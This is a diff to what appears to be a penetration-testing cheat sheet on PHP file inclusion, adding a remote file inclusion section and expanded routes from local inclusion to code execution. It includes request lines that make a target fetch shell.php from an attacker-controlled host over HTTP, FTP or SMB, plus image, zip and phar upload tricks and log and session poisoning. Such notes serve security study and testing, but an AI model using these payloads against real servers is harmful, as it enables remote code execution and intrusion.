@@ -43,10 +43,27 @@ Before trying `data://`/`input://`, confirm the config via the base64 filter:
 
 > Check the config first (which wrappers are even possible), then: `expect://` is the simplest if present; else `data://`/`input://` need `allow_url_include`; else fall back to log poisoning. Each needs a specific setting enabled, so enumerate php.ini via the base64 filter before burning time.
 
+## RFI (Remote File Inclusion)
+If the include allows a remote URL (`allow_url_include = On`), host your payload and include it → RCE. RFI implies LFI, not vice versa; also enables SSRF.
+```text
+?lang=http://<me>/shell.php          # HTTP (python3 -m http.server)
+?lang=ftp://<me>/shell.php           # FTP (pyftpdlib) — WAF bypass
+?lang=\\<me>\share\shell.php         # SMB UNC (impacket smbserver) — Windows, internal
+```
+Test first with `?lang=http://127.0.0.1/` to confirm remote fetch works.
+
 ## LFI → RCE paths
 - **PHP filter source disclosure** → read config/source → find creds or the next bug.
-- **Log poisoning:** inject PHP into a log (User-Agent → access.log, or auth.log/ mail) then LFI the log → it executes. (Webshell payload not stored here.)
-- **PHP session / file upload + LFI**, `/proc/self/environ`, data/input wrappers.
+- **Upload + LFI** (when upload exists but doesn't execute): embed PHP in a file the server stores, then LFI it:
+  - **Image**: valid magic bytes (`GIF89a;`) + PHP appended, upload as `.gif`, LFI the path.
+  - **zip://**: upload a zip containing a PHP shell → `?lang=zip://uploaded.zip%23shell.php` (needs zip ext).
+  - **phar://**: pack PHP in a phar → `?lang=phar://uploaded.phar/shell` (needs phar ext).
+- **Log poisoning** (need read access to the log):
+  - **Server logs**: poison `User-Agent` (or any logged header) with PHP → LFI `access.log` (Apache `/var/log/apache2/access.log`, Nginx) → executes. (Webshell not stored here.)
+  - **PHP session**: put PHP in a controllable session var → LFI the session file (`/var/lib/php/sessions/sess_<PHPSESSID>`).
+  - Others: `/proc/self/environ`, `/proc/self/fd/N`, mail logs, vsftpd/sshd logs.
+
+> RFI is instant RCE when `allow_url_include` is on (test `http://127.0.0.1` first). When it's off: PHP filter to read source → upload+LFI or log poisoning to execute. Match the technique to which PHP extensions/settings are enabled (check php.ini via the base64 filter).
 
 ## Find include params & files
 ```bash
